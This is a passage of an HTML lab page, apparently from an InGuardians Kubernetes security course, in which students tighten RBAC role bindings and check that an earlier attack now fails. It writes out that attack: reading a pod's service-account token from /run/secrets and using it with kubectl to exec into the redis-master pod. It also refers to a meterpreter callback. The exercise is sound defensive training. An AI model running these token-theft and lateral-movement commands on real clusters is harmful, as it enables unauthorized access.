+<p>Now look at a role binding file, which assigns a role (capabilities) to a service account.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>binding-get-only-on-pods-frontend.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that the role binding is pretty simple. It specifies a subject, in this case a service account, and a role, in this case, <code>get-only-on-pods</code>. It gives this pairing a name, &quot;get-only-on-pods-redis-binding.&quot;</p>
+</li>
+<li>
+<p>Apply the role bindings to both the <code>frontend</code> and <code>redis</code> roles:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> binding-get-only-on-pods-frontend.yaml
+kubectl apply <span class="nt">-f</span> binding-get-only-on-pods-redis.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, delete the rolebindings that were giving more powerful roles to the <code>frontend</code> and <code>redis</code> service accounts:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete rolebinding frontend-get-list-exec-pods-binding
+kubectl delete rolebinding redis-full-rw-and-exec-on-pods-binding
+</code></pre></div></div>
+</li>
+<li>
+<p>Now check out how effective your RBAC has been.  First, delete the attack-pod.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete pod attack-pod
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, <code>kubectl</code> exec into the same frontend pod that you started this exercise on:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> <span class="k">${</span><span class="nv">PODNAME</span><span class="p">-WRITTEN-DOWN-IN-STEP-38</span><span class="k">}</span> <span class="nt">--</span> /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>From the frontend pod, try to exec into the <code>redis-master</code> pod, as in the original attack:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">DIR</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"/var/www/html/kubectl --token=</span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$DIR</span>/token<span class="sb">`</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+ --certificate-authority=</span><span class="nv">$DIR</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+ --server=https://kubernetes.default.svc.cluster.local:443"</span>
+
+kubectl <span class="nb">exec</span> <span class="nt">-it</span> <span class="se">\</span>
+ <span class="si">$(</span>kubectl get pods | <span class="nb">grep </span>redis-master | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="si">)</span> <span class="nt">--</span> /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>You should get a pretty involved error message, since the get pods will fail.</p>
+</li>
+<li>
+<p>For extra credit, after the class ends, create a network policy that doesn't allow the <code>frontend</code> or <code>redis-master</code> pods to initiate any connections outbound, so that our original meterpreter can't connect back to the Metasploit console.</p>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
